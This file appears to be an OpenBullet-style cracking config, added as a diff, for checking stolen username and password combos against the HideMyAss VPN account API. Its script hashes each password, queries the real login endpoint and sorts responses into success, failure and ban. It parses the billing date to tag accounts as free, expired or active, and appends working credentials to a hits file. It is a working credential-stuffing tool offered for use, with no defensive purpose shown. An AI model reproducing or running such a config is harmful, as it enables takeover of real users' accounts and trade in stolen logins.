@@ -1,0 +1,87 @@
+[SETTINGS]
+{
+  "Name": "HMA (hide my ass)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-07T03:45:09.1453702+04:30",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.3 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Hash MD5 "<PASS>" -> VAR "P" 
+
+REQUEST GET "https://vpn.hidemyass.com/vpncontrol/accounts/info28/<USER>/<P>?platform=win64&ver=2.8.24.0&osver=10.0.19041.0&tls=true" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "The username and password you entered are incorrect." 
+  KEYCHAIN Failure OR 
+    KEY "The username and password you entered are incorrect" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+
+PARSE "<SOURCE>" LR "NEXT_BILL:" "TIME" -> VAR "CHECK" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<CHECK>" DoesNotContain "-" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd" "<CHECK>" -> VAR "DATE" 
+
+FUNCTION CurrentUnixTime "yyyy-MM-dd" -> VAR "NOW" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<DATE>" GreaterThan "<NOW>" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<NOW>" GreaterThan "<DATE>" 
+
+PARSE "<SOURCE>" LR "" "" CreateEmpty=FALSE -> CAP "CAPTURE" 
+
+UTILITY File "HMA Hit New.txt" AppendLines "<USER>:<PASS>" 
+
